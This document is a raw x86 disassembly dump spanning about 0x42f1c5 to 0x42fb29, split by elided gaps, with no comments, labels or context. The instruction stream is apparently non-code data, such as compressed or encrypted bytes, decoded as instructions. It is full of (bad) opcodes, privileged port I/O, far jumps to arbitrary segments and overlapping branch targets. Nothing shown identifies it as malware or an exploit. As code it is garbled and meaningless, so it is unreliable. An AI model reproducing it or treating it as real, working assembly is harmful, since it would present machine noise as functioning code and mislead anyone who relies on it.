  42f1c5:	sahf   
  42f1c6:	add    WORD PTR [edx+0x5dc96a8e],si
  42f1cd:	sub    al,0xfe
  42f1cf:	je     0x42f1a9
  42f1d1:	or     eax,0x64c0daf
  42f1d6:	add    BYTE PTR [eax],0x38
  42f1d9:	dec    eax
  42f1da:	jp     0x42f175
  42f1dc:	mov    ecx,0x6e4cfe1
  42f1e1:	xor    esp,DWORD PTR [ebx]
  42f1e3:	std    
  42f1e4:	sahf   
  42f1e5:	xchg   edx,eax
  42f1e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f1e7:	mov    cl,0x56
  42f1ea:	sub    DWORD PTR [edx+0x39],ecx
  42f1ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f1ee:	scas   eax,DWORD PTR es:[edi]
  42f1ef:	mov    dh,0x21
  42f1f1:	dec    ebx
  42f1f2:	inc    eax
  42f1f3:	shl    DWORD PTR [ebx],cl
  42f1f5:	mov    esi,0x597acd40
  42f1fa:	xchg   ebx,eax
  42f1fb:	lds    ebp,FWORD PTR [ecx+eax*4-0x38]
  42f1ff:	sahf   
  42f200:	push   es
  42f201:	or     ch,BYTE PTR [ebp-0x1e]
  42f204:	mov    ebp,0xb74fd25a
  42f209:	stc    
  42f20a:	sar    BYTE PTR [ecx-0x43],1
  42f20d:	push   eax
  42f20e:	xor    eax,0xa051134
  42f213:	xchg   ecx,eax
  42f214:	mov    ecx,0x2832ca76
  42f219:	pop    edi
  42f21a:	punpcklbw mm3,mm6
  42f21d:	ret    
  42f21e:	add    BYTE PTR ds:0x4f0ffbe2,dl
  42f224:	mov    bh,bl
  42f226:	adc    DWORD PTR [eax-0x408c66fa],ebx
  42f22c:	dec    esi
  42f22d:	and    DWORD PTR [eax-0x5e],ebp
  42f230:	in     eax,0x6
  42f232:	xchg   esp,esp
  42f234:	mov    ds:0xa0bca0a7,eax
  42f239:	pop    ss
  42f23a:	das    
  42f23b:	xor    ecx,0x4cd6a5dd
  42f241:	xchg   ecx,eax
  42f242:	dec    esp
  42f243:	sar    DWORD PTR [ebx+0x33cc59f1],1
  42f249:	loop   0x42f27e
  42f24b:	cmp    BYTE PTR [edx+0x368438],dh
  42f251:	sub    al,0x29
  42f253:	pop    eax
  42f254:	test   al,0x17
  42f256:	bound  eax,QWORD PTR [eax+ecx*4]
  42f259:	mov    bh,0x0
  42f25b:	cmp    BYTE PTR [edx+edi*1],0x13
  42f25f:	jns    0x42f2db
  42f261:	sbb    eax,0xfb2c64fa
  42f266:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f267:	jb     0x42f2d0
  42f269:	jecxz  0x42f25e
  42f26b:	xor    al,0xfd
  42f26d:	mov    DWORD PTR [ebx],0x81533067
  42f273:	or     eax,0xf969b61f
  42f278:	aas    
  42f279:	out    0x55,eax
  42f27b:	sbb    DWORD PTR [ebx-0x35],esi
  42f27e:	out    dx,eax
  42f27f:	add    ebp,DWORD PTR [ebx+0xd]
  42f282:	fnsave [edx+0x6213162f]
  42f288:	sub    ch,BYTE PTR [ebx]
  42f28a:	jecxz  0x42f28c
  42f28c:	xor    esi,DWORD PTR [ecx+0x79826aee]
  42f292:	xlat   BYTE PTR ds:[ebx]
  42f293:	sub    ebp,DWORD PTR [esi+0x38]
  42f296:	mov    eax,0x7f6697f7
  42f29b:	cmp    BYTE PTR [edi],dh
  42f29d:	inc    esp
  42f29e:	ins    DWORD PTR es:[edi],dx
  42f29f:	lea    edi,[ebx-0x6f]
  42f2a2:	add    dl,BYTE PTR [edi]
  42f2a4:	bound  ebp,QWORD PTR [edx+0x6f]
  42f2a7:	push   ss
  42f2a8:	popa   
  42f2a9:	icebp  
  42f2aa:	addr16 sbb al,dl
  42f2ad:	jle    0x42f31a
  42f2af:	pusha  
  42f2b0:	or     eax,0xf08179f4
	...
  42f315:	add    BYTE PTR [ebp-0x5075f7e6],bh
  42f31b:	call   0x6da4:0xb5dd3fbf
  42f322:	and    dl,ah
  42f324:	repz fs loop 0x42f321
  42f328:	add    DWORD PTR [eax],eax
  42f32a:	pop    es
  42f32b:	add    DWORD PTR [eax],eax
  42f32d:	add    bl,cl
  42f32f:	mov    ecx,DWORD PTR [ebx-0x7a305aab]
  42f335:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f336:	mov    cl,0x7a
  42f338:	sar    ch,1
  42f33a:	mov    ds:0xf7be43dc,eax
  42f33f:	lods   eax,DWORD PTR ds:[esi]
  42f340:	xchg   ebp,eax
  42f341:	and    al,0x44
  42f343:	add    eax,DWORD PTR [ebx+0x481dd887]
  42f349:	or     bh,BYTE PTR [edx+eax*8-0x6c]
  42f34d:	sub    dh,ah
  42f34f:	push   ebp
  42f350:	shr    ebx,1
  42f352:	cmp    DWORD PTR [ebx],ecx
  42f354:	in     eax,0x6f
  42f356:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f357:	pop    eax
  42f358:	push   esp
  42f359:	mov    esp,0xbc2af54d
  42f35e:	clc    
  42f35f:	sbb    eax,0x55318b23
  42f364:	inc    ebp
  42f365:	in     eax,dx
  42f366:	pop    edi
  42f367:	pop    ebp
  42f368:	adc    DWORD PTR [edx-0x2ea9a533],esp
  42f36e:	in     eax,dx
  42f36f:	pop    ecx
  42f370:	dec    esp
  42f371:	addr16 in eax,dx
  42f373:	ins    BYTE PTR es:[edi],dx
  42f374:	fild   WORD PTR [esi-0x47]
  42f377:	fsubr  DWORD PTR [esi+0x55]
  42f37a:	inc    esi
  42f37b:	call   0x714b510a
  42f380:	outs   dx,DWORD PTR ds:[esi]
  42f381:	fistp  WORD PTR [ebp-0x4f2e5803]
  42f387:	jnp    0x42f389
  42f389:	mov    ah,al
  42f38b:	inc    edx
  42f38c:	and    eax,0x8b4cb218
  42f391:	inc    esi
  42f392:	icebp  
  42f393:	bound  edi,QWORD PTR [ecx-0x60]
  42f396:	pop    esp
  42f397:	xor    eax,0x11e8faa
  42f39c:	or     BYTE PTR [ebx],al
  42f39e:	or     eax,0xb7320fa1
  42f3a3:	in     eax,0x31
  42f3a5:	xchg   ebx,eax
  42f3a6:	dec    ebp
  42f3a7:	cli    
  42f3a8:	out    0xb6,al
  42f3aa:	cld    
  42f3ab:	push   ss
  42f3ac:	xor    eax,0x660152f5
  42f3b1:	jb     0x42f428
  42f3b3:	pop    ebx
  42f3b4:	jecxz  0x42f41a
  42f3b6:	push   eax
  42f3b7:	adc    esi,esp
  42f3b9:	and    eax,0xce92efa4
  42f3be:	inc    edi
  42f3bf:	lods   al,BYTE PTR ds:[esi]
  42f3c0:	prefetchwt1 (bad)
  42f3c1:	or     eax,0x6151f7d1
  42f3c6:	fadd   QWORD PTR [eax-0x7]
  42f3c9:	mov    ebp,0x8cde1f61
  42f3ce:	leave  
  42f3cf:	pusha  
  42f3d0:	out    dx,eax
  42f3d1:	adc    esi,DWORD PTR [ecx]
  42f3d3:	adc    al,0x32
  42f3d5:	xchg   esp,eax
  42f3d6:	inc    ecx
  42f3d7:	shr    DWORD PTR [ecx-0x31],1
  42f3da:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f3dc:	xchg   ecx,eax
  42f3dd:	ret    0x81b4
  42f3e0:	push   0x3e81f3b5
  42f3e5:	adc    DWORD PTR [edi+0x514a1420],edx
  42f3eb:	lea    edx,[ecx+0x37753209]
  42f3f1:	xor    DWORD PTR [esi-0x28],ebp
  42f3f4:	xlat   BYTE PTR ds:[ebx]
  42f3f5:	loopne 0x42f391
  42f3f7:	cli    
  42f3f8:	jp     0x42f3c3
  42f3fa:	adc    eax,0xad6a6b70
  42f3ff:	mov    BYTE PTR [bx+0x6fbb],bh
  42f404:	nop
  42f405:	test   BYTE PTR [ebp-0x851e7ae],dl
  42f40b:	(bad)  
  42f40c:	addr16 push ds
  42f40e:	adc    eax,0x1944866f
  42f413:	shl    DWORD PTR [edi+ecx*1],1
  42f416:	pop    es
  42f417:	js     0x42f3c6
  42f419:	repnz es xor dl,al
  42f41d:	push   eax
  42f41e:	sub    eax,0x47d0644f
  42f423:	sub    al,0xb4
  42f425:	lods   al,BYTE PTR ds:[esi]
  42f426:	and    BYTE PTR [ebx],bl
  42f428:	in     al,0x89
  42f42a:	(bad)  
  42f42b:	iret   
  42f42c:	inc    esi
  42f42d:	xor    ch,ah
  42f42f:	xor    BYTE PTR [ecx-0x2],cl
  42f432:	(bad)  
  42f433:	stc    
  42f434:	outs   dx,DWORD PTR ds:[esi]
	...
  42f495:	add    BYTE PTR [edi],dh
  42f497:	jae    0x42f4e3
  42f499:	cdq    
  42f49a:	dec    esi
  42f49b:	mov    ecx,0x1986fff7
  42f4a0:	jge    0x42f502
  42f4a2:	stc    
  42f4a3:	mov    cl,0xde
  42f4a5:	add    al,0xe9
  42f4a7:	cli    
  42f4a8:	add    DWORD PTR [eax],eax
  42f4aa:	pop    es
  42f4ab:	add    DWORD PTR [eax],eax
  42f4ad:	add    BYTE PTR [eax+0x7b],cl
  42f4b0:	push   esi
  42f4b1:	push   ebp
  42f4b2:	sub    eax,0xb144553b
  42f4b7:	and    BYTE PTR [ebp+0x4c],0x3d
  42f4bb:	push   esp
  42f4bc:	mov    es,edx
  42f4be:	adc    BYTE PTR [ebp-0x12],al
  42f4c1:	mov    bl,0xae
  42f4c3:	cmp    al,0x88
  42f4c5:	cmc    
  42f4c6:	inc    ecx
  42f4c7:	jmp    0x42f471
  42f4c9:	sbb    al,BYTE PTR [edi-0x42e3da95]
  42f4cf:	and    eax,0xd5215479
  42f4d4:	pop    edi
  42f4d5:	sbb    bl,BYTE PTR [edi-0x52]
  42f4d8:	clc    
  42f4d9:	test   BYTE PTR [eax],cl
  42f4db:	dec    esi
  42f4dc:	mov    ch,BYTE PTR [eax+0x31d73ac7]
  42f4e2:	pop    esp
  42f4e3:	daa    
  42f4e4:	mov    esp,0x93b15d43
  42f4e9:	jo     0x42f4b4
  42f4eb:	sbb    BYTE PTR [edx],0x10
  42f4ee:	mov    ds:0x7f4cbfc5,eax
  42f4f3:	stos   BYTE PTR es:[edi],al
  42f4f4:	add    BYTE PTR [edx+esi*2],0x3c
  42f4f8:	jg     0x42f509
  42f4fa:	and    eax,0xe7aafd0d
  42f4ff:	(bad)  
  42f500:	xor    bh,dl
  42f502:	and    BYTE PTR ds:0x784b439c,ch
  42f508:	pop    ds
  42f509:	rcr    DWORD PTR [eax-0x55273cdc],0xcd
  42f510:	fisubr WORD PTR [ebx+ebp*1]
  42f513:	and    DWORD PTR [ebx-0x24],esp
  42f516:	inc    ebx
  42f517:	cld    
  42f518:	dec    esp
  42f519:	rcr    BYTE PTR [ebp+0x2e],cl
  42f51c:	jae    0x42f579
  42f51e:	and    al,dh
  42f520:	mov    eax,0x5bc723b0
  42f525:	push   ds
  42f526:	ror    al,1
  42f528:	jl     0x42f594
  42f52a:	and    DWORD PTR [ecx],0x7cbca11d
  42f530:	es sub ah,dh
  42f533:	mov    al,0x21
  42f535:	inc    edi
  42f536:	and    DWORD PTR ds:0xcfb43ac4,edi
  42f53c:	push   0xffffffa3
  42f53e:	xchg   BYTE PTR [ebx+ecx*8+0x792436bb],dl
  42f545:	pop    edi
  42f546:	loopne 0x42f595
  42f548:	mov    ebp,0xf5cdc8db
  42f54d:	nop
  42f54e:	dec    esp
  42f54f:	repnz fild QWORD PTR [ebp+0x5c]
  42f553:	outs   dx,DWORD PTR ds:[esi]
  42f554:	outs   dx,BYTE PTR ds:[esi]
  42f555:	add    DWORD PTR [ebp-0x7b],ebp
  42f558:	cwde   
  42f559:	iret   
  42f55a:	cwde   
  42f55b:	rcl    DWORD PTR ds:0x20014116,1
  42f561:	in     eax,dx
  42f562:	or     edi,DWORD PTR [ebx+0x4]
  42f565:	ret    0x35f1
  42f568:	adc    al,BYTE PTR [eax+0x59]
  42f56b:	fbld   TBYTE PTR [esp+eiz*2-0x1d]
  42f56f:	dec    edi
  42f570:	daa    
  42f571:	dec    esi
  42f572:	imul   ecx,esi,0xffffffd5
  42f575:	sub    al,0xfe
  42f577:	rol    BYTE PTR [ebp-0x1a],0xc7
  42f57b:	test   al,0x2d
  42f57d:	sbb    BYTE PTR [esi+0x520dabef],dl
  42f583:	xchg   ecx,eax
  42f584:	sub    DWORD PTR [ecx-0x63],0xc34b51e7
  42f58b:	or     esi,DWORD PTR [ebp+0x70]
  42f58e:	sbb    al,0x18
  42f590:	mov    ds:0x3b0cbb82,al
  42f595:	xchg   esp,eax
  42f596:	cvtpi2ps xmm4,QWORD PTR [ebp+eax*1+0x4b430c32]
  42f59e:	stos   DWORD PTR es:[edi],eax
  42f59f:	lods   eax,DWORD PTR ds:[esi]
  42f5a0:	je     0x42f617
  42f5a2:	xor    DWORD PTR [esi+0x76],ebp
  42f5a5:	ss bound edx,QWORD PTR cs:[ebp-0x1d4e1b]
  42f5ad:	cld    
  42f5ae:	jae    0x42f57d
  42f5b0:	hlt    
  42f5b1:	pushf  
  42f5b2:	adc    esp,DWORD PTR [edx]
  42f5b4:	daa    
	...
  42f615:	add    BYTE PTR [esi],bh
  42f617:	push   esi
  42f618:	into   
  42f619:	nop
  42f61a:	out    dx,al
  42f61b:	cwde   
  42f61c:	jle    0x42f61c
  42f61e:	pop    edx
  42f61f:	or     bh,BYTE PTR [ebx+edx*2-0x3d]
  42f623:	mov    eax,ds:0xfbf02de3
  42f628:	add    DWORD PTR [eax],eax
  42f62a:	pop    es
  42f62b:	add    DWORD PTR [eax],eax
  42f62d:	add    BYTE PTR [esi+ebp*8-0x5f95a91c],al
  42f634:	dec    esp
  42f635:	mov    ah,0xa9
  42f637:	fisttp WORD PTR [eax]
  42f639:	pop    ebx
  42f63a:	mov    dl,0xa1
  42f63c:	push   ebp
  42f63d:	fldenv [eax]
  42f63f:	hlt    
  42f640:	dec    ecx
  42f641:	lds    esi,FWORD PTR [edi+0x35]
  42f644:	mov    bl,0xd2
  42f646:	mov    eax,DWORD PTR [ebx-0x41]
  42f649:	mov    bl,0x74
  42f64b:	inc    edi
  42f64c:	mov    al,0x38
  42f64e:	mul    BYTE PTR [edi-0x7a167749]
  42f654:	popa   
  42f655:	push   cs
  42f656:	aaa    
  42f657:	ss cmc 
  42f659:	push   0x62
  42f65b:	push   eax
  42f65c:	imul   BYTE PTR [ebx]
  42f65e:	dec    eax
  42f65f:	push   0xffffffb5
  42f661:	mov    ds:0xd5c4b375,al
  42f666:	outs   dx,BYTE PTR ds:[esi]
  42f667:	sub    ah,dl
  42f669:	test   BYTE PTR [eax-0x7b],cl
  42f66c:	lock jp 0x42f6b2
  42f66f:	dec    esp
  42f670:	stos   DWORD PTR es:[edi],eax
  42f671:	lods   al,BYTE PTR ds:[esi]
  42f672:	cdq    
  42f673:	push   ds
  42f674:	push   eax
  42f675:	and    al,0x15
  42f677:	aaa    
  42f678:	cmp    eax,0xbf14f3a
  42f67d:	mov    edi,0xdbc190f0
  42f682:	jnp    0x42f6ab
  42f684:	jmp    0x111231df
  42f689:	dec    eax
  42f68a:	stos   BYTE PTR es:[edi],al
  42f68b:	in     al,dx
  42f68c:	sbb    cl,BYTE PTR [ebx+0x374aac27]
  42f692:	add    al,0x6a
  42f694:	push   ecx
  42f695:	das    
  42f696:	hlt    
  42f697:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f698:	push   ebp
  42f699:	scas   al,BYTE PTR es:[edi]
  42f69a:	xor    al,0x95
  42f69c:	ret    0x2908
  42f69f:	retf   0x1295
  42f6a2:	addr16 sbb eax,0x3f81f39e
  42f6a8:	adc    eax,ebx
  42f6aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f6ab:	int3   
  42f6ac:	mov    cl,0xf0
  42f6ae:	cmp    edi,DWORD PTR [ecx-0x3f]
  42f6b1:	gs out 0x2c,al
  42f6b4:	bound  edi,QWORD PTR [bx]
  42f6b7:	pop    DWORD PTR [esi-0x68e3d697]
  42f6bd:	xchg   edx,eax
  42f6be:	jo     0x42f731
  42f6c0:	hlt    
  42f6c1:	mov    BYTE PTR [ecx+0x20cc2c0],cl
  42f6c7:	push   esi
  42f6c8:	inc    edx
  42f6c9:	dec    edi
  42f6ca:	push   ebx
  42f6cb:	or     eax,0x4bb6d62b
  42f6d0:	aad    0x8
  42f6d2:	into   
  42f6d3:	daa    
  42f6d4:	adc    BYTE PTR [ecx+0x5b7cdaf0],dl
  42f6da:	sub    edi,edx
  42f6dc:	mov    eax,ds:0x624f3ba5
  42f6e1:	xor    BYTE PTR [eax-0x7ca8ecaa],0x71
  42f6e8:	mov    cl,0xdb
  42f6ea:	sub    ch,BYTE PTR [ebp+0x1be318d7]
  42f6f0:	ds (bad) 
  42f6f2:	xchg   ecx,eax
  42f6f3:	mov    dh,BYTE PTR [esi+0x30]
  42f6f6:	addr16 push ebx
  42f6f8:	xchg   BYTE PTR [edi+esi*1+0x7f],bl
  42f6fc:	out    dx,al
  42f6fd:	fwait
  42f6fe:	shl    bl,0x3a
  42f701:	xor    al,0xc2
  42f703:	mov    esp,0x3b6ffe27
  42f708:	arpl   dx,bx
  42f70a:	(bad)  
  42f70b:	(bad)  
  42f70d:	out    0x3a,eax
  42f70f:	jo     0x42f720
  42f711:	sub    eax,0x9cce09b0
  42f716:	icebp  
  42f717:	into   
  42f718:	mov    ah,0x4e
  42f71a:	lds    eax,FWORD PTR [ecx-0x3e]
  42f71d:	inc    edi
  42f71e:	xchg   esi,eax
  42f71f:	das    
  42f720:	add    BYTE PTR [esi],ah
  42f722:	cwde   
  42f723:	mov    ds:0xeb0f02ee,al
  42f728:	cmp    al,0x60
  42f72a:	mov    ebp,edi
  42f72c:	out    0x21,eax
  42f72e:	mov    ebp,0x713f6571
  42f733:	lds    ebp,FWORD PTR [ecx+0x0]
	...
  42f796:	jno    0x42f739
  42f798:	(bad)  
  42f799:	test   al,0xd6
  42f79b:	(bad)  
  42f79c:	jg     0x42f797
  42f79e:	in     al,0x8a
  42f7a0:	jmp    0x42f76f
  42f7a2:	push   edx
  42f7a3:	and    DWORD PTR [ebx+0x7a],ebx
  42f7a6:	idiv   esp
  42f7a8:	add    DWORD PTR [eax],eax
  42f7aa:	pop    es
  42f7ab:	add    DWORD PTR [eax],eax
  42f7ad:	add    ch,dl
  42f7af:	scas   al,BYTE PTR es:[edi]
  42f7b0:	hlt    
  42f7b1:	in     eax,dx
  42f7b2:	mov    ecx,DWORD PTR [ebx+0x79]
  42f7b5:	jo     0x42f816
  42f7b7:	or     ecx,DWORD PTR [edx+0x66d446d5]
  42f7bd:	ret    0xd390
  42f7c0:	shl    DWORD PTR ds:0x7ad6962f,0x6a
  42f7c7:	(bad)  
  42f7c8:	or     ebx,DWORD PTR [esi-0x22]
  42f7cb:	adc    esp,ecx
  42f7cd:	int    0xa
  42f7cf:	ins    BYTE PTR es:[edi],dx
  42f7d0:	add    eax,0x8fc8e2fc
  42f7d5:	outs   dx,DWORD PTR ds:[esi]
  42f7d6:	sub    esi,DWORD PTR [esi]
  42f7d8:	adc    DWORD PTR [eax+0x1c3b2fd5],esp
  42f7de:	jo     0x42f85c
  42f7e0:	ret    
  42f7e1:	mov    edx,0x9e3500c6
  42f7e6:	pop    esi
  42f7e7:	rcr    BYTE PTR [ebp+ecx*4+0x26aa0ea4],1
  42f7ee:	imul   ebp,edi,0xbeaaa762
  42f7f4:	mov    dl,0x9f
  42f7f6:	es mov al,0x8c
  42f7f9:	add    eax,ecx
  42f7fb:	xchg   DWORD PTR [esi],esp
  42f7fd:	int3   
  42f7fe:	pop    ecx
  42f7ff:	(bad)  
  42f801:	fwait
  42f802:	and    dh,BYTE PTR [eax-0x520e96da]
  42f808:	push   es
  42f809:	repz inc ebp
  42f80b:	rol    BYTE PTR [edi-0x1bc903f5],0x75
  42f812:	fwait
  42f813:	push   es
  42f814:	into   
  42f815:	mov    dh,0xe7
  42f817:	inc    ecx
  42f818:	test   bl,dh
  42f81a:	dec    eax
  42f81b:	leave  
  42f81c:	pop    ebx
  42f81d:	push   0xffffffe9
  42f81f:	loop   0x42f7a1
  42f821:	sub    BYTE PTR [edx+0x4b],ch
  42f824:	xchg   edx,eax
  42f825:	xlat   BYTE PTR ds:[ebx]
  42f826:	inc    edi
  42f827:	adc    BYTE PTR [ebp*8-0x77f51c01],dl
  42f82e:	mov    bl,0xae
  42f830:	stc    
  42f831:	fadd   QWORD PTR [esi+ebx*8]
  42f834:	popf   
  42f835:	aas    
  42f836:	jmp    FWORD PTR [edi+0x47]
  42f839:	mov    edx,0x7ad1ed3a
  42f83e:	mov    dh,0x37
  42f840:	test   ebp,eax
  42f842:	bound  esi,QWORD PTR [ebx]
  42f844:	lock pop esp
  42f846:	jo     0x42f89d
  42f848:	xor    dl,BYTE PTR [esi+0x3f74cf29]
  42f84e:	mov    al,0xb0
  42f850:	data16 lods al,BYTE PTR ds:[esi]
  42f852:	jg     0x42f7e2
  42f854:	jmp    FWORD PTR [eax+0x26]
  42f857:	fiadd  WORD PTR [ecx]
  42f859:	jle    0x42f822
  42f85b:	jno    0x42f862
  42f85d:	mov    dl,0xd9
  42f85f:	mov    ebp,0xf41b9b81
  42f864:	aas    
  42f865:	mov    bh,0xd1
  42f867:	jl     0x42f874
  42f869:	loop   0x42f81f
  42f86b:	inc    ebp
  42f86c:	mov    dl,0xac
  42f86e:	and    al,0x69
  42f870:	adc    bh,BYTE PTR [esi+0x4]
  42f873:	call   0x48041291
  42f878:	push   ss
  42f879:	arpl   ax,ax
  42f87b:	pusha  
  42f87c:	retf   0x88f1
  42f87f:	out    dx,al
  42f880:	mov    esp,0xbf27e162
  42f885:	fs cwde 
  42f887:	popa   
  42f888:	pushf  
  42f889:	pop    edx
  42f88a:	or     esi,DWORD PTR [ecx]
  42f88c:	push   ecx
  42f88d:	cmp    dl,cl
  42f88f:	add    al,0x9
  42f891:	fcomp  QWORD PTR [edi]
  42f893:	add    dh,ah
  42f895:	mov    ecx,DWORD PTR [edi-0x1e677bb2]
  42f89b:	add    bh,BYTE PTR [ebx-0x663bc431]
  42f8a1:	or     ebx,DWORD PTR [ebx]
  42f8a3:	inc    ebp
  42f8a4:	sbb    BYTE PTR [esp+eax*1-0x48],dh
  42f8a8:	jno    0x42f91b
  42f8aa:	mov    ds:0x31afa801,al
  42f8af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f8b0:	(bad)  
  42f8b1:	cwde   
  42f8b2:	sub    BYTE PTR [edx+0x91],ch
	...
  42f914:	add    BYTE PTR [eax],al
  42f916:	adc    al,0x74
  42f918:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f919:	push   ebp
  42f91a:	in     al,0xd5
  42f91c:	cmc    
  42f91d:	jne    0x42f8e0
  42f91f:	ror    DWORD PTR [ecx-0x48711a64],1
  42f925:	outs   dx,DWORD PTR ds:[esi]
  42f926:	(bad)  
  42f927:	std    
  42f928:	add    DWORD PTR [eax],eax
  42f92a:	pop    es
  42f92b:	add    DWORD PTR [eax],eax
  42f92d:	add    dh,dh
  42f92f:	dec    edi
  42f930:	(bad)  
  42f931:	fisttp DWORD PTR [edi+0x59]
  42f934:	retf   0xc20e
  42f937:	(bad)  
  42f938:	mov    al,0x99
  42f93a:	dec    edx
  42f93b:	out    0x7,eax
  42f93d:	or     DWORD PTR [eax],ebx
  42f93f:	(bad)  
  42f940:	cmp    ebx,edx
  42f942:	mov    esp,0x2f082ba2
  42f947:	(bad)  
  42f948:	mov    ebx,0xc75af0e8
  42f94d:	fist   WORD PTR [eax+0x2a2748]
  42f953:	xchg   edx,eax
  42f954:	sbb    bl,BYTE PTR [ecx-0x6093dd17]
  42f95a:	cmp    BYTE PTR [ebp+0x51aea54b],0x6a
  42f961:	inc    esi
  42f962:	xor    bl,ah
  42f964:	pop    esp
  42f965:	outs   dx,DWORD PTR ds:[esi]
  42f966:	std    
  42f967:	adc    ebp,0x72
  42f96a:	pushf  
  42f96b:	sub    DWORD PTR [esp+ebx*1-0x44],ebp
  42f96f:	jmp    0x5823:0xe0523373
  42f976:	imul   edx,DWORD PTR [eax-0x3365afb5],0xda3246f5
  42f980:	push   ebx
  42f981:	aas    
  42f982:	and    eax,0x929e8d8e
  42f987:	retf   0x275d
  42f98a:	dec    ebp
  42f98b:	or     DWORD PTR [edx+0x714b4954],ebx
  42f991:	ja     0x42f963
  42f993:	in     al,dx
  42f994:	sti    
  42f995:	sbb    ebp,DWORD PTR [esi]
  42f997:	sahf   
  42f998:	iret   
  42f999:	jmp    0x77490def
  42f99e:	enter  0xe38f,0x1a
  42f9a2:	xor    DWORD PTR [edx-0x67699f1a],0x18
  42f9a9:	xchg   esi,eax
  42f9aa:	sub    al,0x18
  42f9ac:	popf   
  42f9ad:	add    al,0xa8
  42f9af:	or     ch,BYTE PTR ds:0x5dfc1875
  42f9b5:	sbb    ebp,DWORD PTR [edi-0x1395a4c6]
  42f9bb:	jnp    0x42f947
  42f9bd:	xor    bh,bh
  42f9bf:	out    0x30,al
  42f9c1:	sub    BYTE PTR [ebx+0x4c],ch
  42f9c4:	cmp    ch,BYTE PTR [ebx+0x68]
  42f9c7:	or     bl,BYTE PTR [ebx+0x5890b0aa]
  42f9cd:	inc    edi
  42f9ce:	adc    bl,ah
  42f9d0:	in     al,dx
  42f9d1:	xchg   esp,eax
  42f9d2:	sahf   
  42f9d3:	clc    
  42f9d4:	push   esp
  42f9d5:	xchg   ecx,eax
  42f9d6:	out    dx,al
  42f9d7:	rcl    esp,cl
  42f9d9:	pop    edi
  42f9da:	fsincos 
  42f9dc:	jo     0x42f982
  42f9de:	mov    ?,WORD PTR [edx+0x127e96cc]
  42f9e4:	(bad)  
  42f9e5:	xchg   ecx,eax
  42f9e6:	fisubr DWORD PTR [eax-0x42]
  42f9e9:	xchg   edx,eax
  42f9ea:	inc    eax
  42f9eb:	jbe    0x42f997
  42f9ed:	sub    BYTE PTR [eax-0x7b4a45bf],dh
  42f9f3:	scas   al,BYTE PTR es:[edi]
  42f9f4:	sub    BYTE PTR [ecx*8-0x24ce1892],0xcf
  42f9fc:	mov    esi,0x6b7f8043
  42fa01:	sbb    eax,0xbb5eae33
  42fa06:	mov    ebx,0xcc10a5a6
  42fa0b:	pop    ss
  42fa0c:	mov    bh,0xdd
  42fa0e:	dec    edx
  42fa0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fa10:	(bad)  
  42fa11:	sub    BYTE PTR [esi+0x97883ab],0xf3
  42fa18:	shr    bh,cl
  42fa1a:	xchg   ecx,eax
  42fa1b:	inc    edx
  42fa1c:	push   ebp
  42fa1e:	vmwrite ecx,DWORD PTR [ebx]
  42fa21:	test   BYTE PTR [esi],0x90
  42fa24:	mov    cl,0x8f
  42fa26:	out    dx,eax
  42fa27:	fdivr  DWORD PTR ds:0xcf691192
  42fa2d:	mov    edx,ebx
  42fa2f:	mov    ecx,0x463ca2bb
  42fa34:	and    eax,0x0
	...
  42fa95:	add    BYTE PTR [ebx],bl
  42fa97:	out    dx,eax
  42fa98:	shl    BYTE PTR [esi],0xf4
  42fa9b:	aas    
  42fa9c:	(bad)  
  42fa9d:	out    dx,eax
  42fa9e:	sbb    dl,BYTE PTR [esi+eiz*8-0x1c]
  42faa2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42faa3:	xor    DWORD PTR [edi],esp
  42faa5:	into   
  42faa6:	add    eax,0x70001ff
  42faab:	add    DWORD PTR [eax],eax
  42faad:	add    BYTE PTR [ebx-0x3b],dh
  42fab0:	in     al,dx
  42fab1:	aad    0x8a
  42fab3:	pop    esp
  42fab4:	xchg   ebp,eax
  42fab5:	pusha  
  42fab6:	dec    ebp
  42fab7:	add    al,dh
  42fab9:	mov    bh,cl
  42fabb:	mov    ch,0xa8
  42fabd:	shr    ah,1
  42fabf:	idiv   DWORD PTR [eax]
  42fac1:	push   esp
  42fac2:	fcomi  st,st(0)
  42fac4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fac5:	or     eax,0xde40fdae
  42faca:	aam    0x1b
  42facc:	or     eax,0x5e960613
  42fad1:	test   WORD PTR [eax],0x7a6b
  42fad6:	aam    0xee
  42fad8:	loop   0x42faae
  42fada:	or     DWORD PTR [eax],ebp
  42fadc:	pop    edx
  42fadd:	jae    0x42fb0a
  42fadf:	push   ebp
  42fae0:	outs   dx,DWORD PTR ds:[esi]
  42fae1:	adc    esi,edx
  42fae3:	or     ebp,esp
  42fae5:	out    dx,al
  42fae6:	(bad)  
  42fae7:	or     DWORD PTR [edx+ebx*1],ebx
  42faea:	(bad)  
  42faeb:	gs in  eax,0xd9
  42faee:	xchg   esi,eax
  42faef:	aam    0xa5
  42faf1:	jmp    0xd1e4e2f3
  42faf6:	and    BYTE PTR [ecx],ch
  42faf8:	int3   
  42faf9:	sar    BYTE PTR [ebx+0x6fd86f05],1
  42faff:	push   ss
  42fb00:	mov    bl,0x19
  42fb02:	dec    ebx
  42fb03:	adc    al,0xd0
  42fb05:	aaa    
  42fb06:	cmp    DWORD PTR [ecx],ebp
  42fb08:	mov    bl,0xa0
  42fb0a:	aaa    
  42fb0b:	ja     0x42faf0
  42fb0d:	into   
  42fb0e:	xlat   BYTE PTR ds:[ebx]
  42fb0f:	adc    BYTE PTR ds:0x6cd9dcb0,dh
  42fb15:	gs push ds
  42fb17:	mov    cs,ebx
  42fb19:	xchg   ecx,eax
  42fb1a:	xor    ebp,esi
  42fb1c:	xchg   edi,eax
  42fb1d:	sahf   
  42fb1e:	dec    edx
  42fb1f:	mov    ch,0xd8
  42fb21:	cmp    ecx,DWORD PTR [esi]
  42fb23:	sub    DWORD PTR [edi+0x3a],edi
  42fb26:	pushf  
  42fb27:	jge    0x42fafb
  42fb29:	arpl   bx,cx
